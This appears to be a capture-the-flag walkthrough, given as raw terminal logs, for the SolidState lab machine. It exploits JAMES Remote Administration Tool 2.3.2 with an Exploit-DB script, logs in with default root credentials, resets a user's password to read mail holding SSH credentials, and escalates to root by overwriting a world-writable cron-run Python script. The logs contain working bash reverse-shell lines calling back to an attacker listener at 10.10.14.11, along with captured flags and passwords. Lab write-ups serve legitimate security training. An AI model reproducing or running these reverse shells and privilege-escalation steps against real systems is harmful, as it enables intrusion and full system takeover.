@@ -1,0 +1,235 @@
+
+
+Search world writable, excluding proc,sys,dev
+find / -type f -perm -o+w -user root 2>/dev/null | grep -Ev '^/(proc|sys|dev)/'
+
+
+JAMES Remote Administration Tool 2.3.2
+https://www.exploit-db.com/exploits/50347
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ python3 solidstate_exploit.py 
+[-]Usage: python3 solidstate_exploit.py <remote ip> <local ip> <local listener port>
+[-]Example: python3 solidstate_exploit.py 172.16.1.66 172.16.1.139 443
+[-]Note: The default payload is a basic bash reverse shell - check script for details and other options.
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ python3 solidstate_exploit.py 10.10.10.51 10.10.14.11 4444
+[+]Payload Selected (see script for more options):  /bin/bash -i >& /dev/tcp/10.10.14.11/4444 0>&1
+[+]Example netcat listener syntax to use after successful execution: nc -lvnp 4444
+[+]Connecting to James Remote Administration Tool...
+[+]Creating user...
+[+]Connecting to James SMTP server...
+[+]Sending payload...
+[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).
+[+]Don't forget to start a listener on port 4444 before logging in!
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+
+
+
+
+
+
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.10.51 4555
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is '^]'.
+JAMES Remote Administration Tool 2.3.2
+Please enter your login and password
+Login id:
+root
+Password:
+root
+Welcome root. HELP for a list of commands
+listusers
+Existing accounts 6
+user: james
+user: ../../../../../../../../etc/bash_completion.d
+user: thomas
+user: john
+user: mindy
+user: mailadmin
+setpassword mindy writeup
+Password for mindy reset
+quit
+Bye
+Connection closed by foreign host.
+                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ telnet 10.10.10.51 110 
+Trying 10.10.10.51...
+Connected to 10.10.10.51.
+Escape character is '^]'.
+USER mindy
+PASS writeup
++OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
++OK
++OK Welcome mindy
+LIST
++OK 2 1945
+1 1109
+2 836
+.
+RETR2
+-ERR
+RETR 1
++OK Message follows
+Return-Path: <mailadmin@localhost>
+Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 ([192.168.11.142])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
+          for <mindy@localhost>;
+          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
+Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
+From: mailadmin@localhost
+Subject: Welcome
+
+Dear Mindy,
+Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.
+
+We are looking forward to you joining our team and your success at Solid State Security. 
+
+Respectfully,
+James
+.
+RETR 2
++OK Message follows
+Return-Path: <mailadmin@localhost>
+Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 ([192.168.11.142])
+          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
+          for <mindy@localhost>;
+          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
+From: mailadmin@localhost
+Subject: Your Access
+
+Dear Mindy,
+
+
+Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
+Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James
+
+.
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.51] 34888
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls
+ls
+bin
+user.txt
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cat user.txt
+cat user.txt
+a918d460afdad301f70518fd554fbdb4
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cd ..
+cd ..
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ ls
+ls
+james
+mindy
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ sudo -l
+sudo -l
+bash: sudo: command not found
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ cd ..
+cd ..
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ ls
+ls
+bin
+boot
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ cd opt
+cd opt
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls
+ls
+james-2.3.2
+tmp.py
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
+cat tmp.py
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('rm -r /tmp/* ')
+except:
+     sys.exit()
+
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
+ls -la
+total 16
+drwxr-xr-x  3 root root 4096 Aug 22  2017 .
+drwxr-xr-x 22 root root 4096 May 27  2022 ..
+drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
+-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ echo -e "#!/usr/bin/env python\nimport os\nos.system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.11/5555 0>&1'\")" > /opt/tmp.py
+h -c 'bash -i >& /dev/tcp/10.10.14.11/5555 0>&1'\")" > /opt/tmp.py
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
+cat tmp.py
+#!/usr/bin/env python
+import os
+os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.11/5555 0>&1'")
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ps auxww | grep root
+
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 5555             
+listening on [any] 5555 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.51] 51936
+bash: cannot set terminal process group (2783): Inappropriate ioctl for device
+bash: no job control in this shell
+root@solidstate:~# ls
+ls
+root.txt
+root@solidstate:~# cat root.txt
+cat root.txt
+96d8460730ce15e7956644092c53a86e
+root@solidstate:~# 
